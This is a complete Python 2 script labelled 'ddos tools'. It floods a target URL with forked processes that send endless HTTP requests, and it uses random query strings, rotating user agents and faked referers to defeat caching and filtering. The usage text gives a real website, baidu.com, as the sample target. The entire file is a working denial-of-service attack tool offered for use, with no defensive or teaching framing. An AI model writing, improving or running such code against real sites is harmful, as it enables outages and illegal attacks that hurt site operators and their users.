#/usr/bin/python

# function : ddos tools
# author   : firefoxbug

import os
import re
import sys
import time
import signal
import socket
import getopt
import random
import urllib2
import threading

def usage():
	print ''' usage : python attack.py [-t] [-c] http://www.baidu.com/
	-h : help
	-t : lasting time of ddos
	-c : numbers of thread to create'''
	sys.exit()

# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents = []
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers = []
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)

def handler(signum,_):
	if signum == signal.SIGALRM:
		print "Time is up !"
		print "Attack finished !"
	sys.exit()

#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def send_packet(host,param_joiner):
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
		response = urllib2.urlopen(request)
	except urllib2.HTTPError,error:
		pass
	except urllib2.URLError, error:
		pass
#	print "response code = %d "%response.code

def attack(host,param_joiner):
	while True:
		send_packet(host,param_joiner)

def parse_parameters(parameters):

	global url
	global interval
	global num_thread
	interval_def = 30
	num_thread_def = 5
	interval = interval_def
	num_thread = num_thread_def	
	try :
		opts,args = getopt.getopt(parameters,"ht:c:",["help"])
		url = args[0]
		for opt,arg in opts:
			if opt in ('-h','--help'):
				usage()
			elif opt in ('-t','--time'):
				if arg.isalnum():
					interval = arg
				else:
					usage()
			elif opt in ('-c','--count'):
				if arg.isalnum():
					num_thread = arg
				else:
					usage()
	except getopt.GetoptError:  
		print("getopt error!");  
		usage();  
		sys.exit(1);

if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
		sys.exit()
	parse_parameters(sys.argv[1:])
	print "Debug : thread=%d time=%d %s"%(int(num_thread),int(interval),url)
	if url.count('/') == 2:
		url = url + "/"
	m = re.search('http\://([^/]*)/?.*', url)
	try :
		host = m.group(1)
	except AttributeError,e:
		usage()
		sys.exit()

	useragent_list()
	referer_list()

	if url.count("?") > 0:
		param_joiner = "&"
	else:
		param_joiner = "?"
	
	signal.signal(signal.SIGINT, handler)
	signal.signal(signal.SIGALRM, handler)
	signal.alarm(int(interval))

	for i in range(int(num_thread)):
		newpid = os.fork()
		if newpid == 0:
#			signal.signal(signal.SIGINT, signal.SIG_DFL)
			attack(host,param_joiner)
		else:
			pass 
#			print ("Child process",os.getpid(),newpid)
	time.sleep(int(interval))
	signal.alarm(0)
	print "main thread exit..."
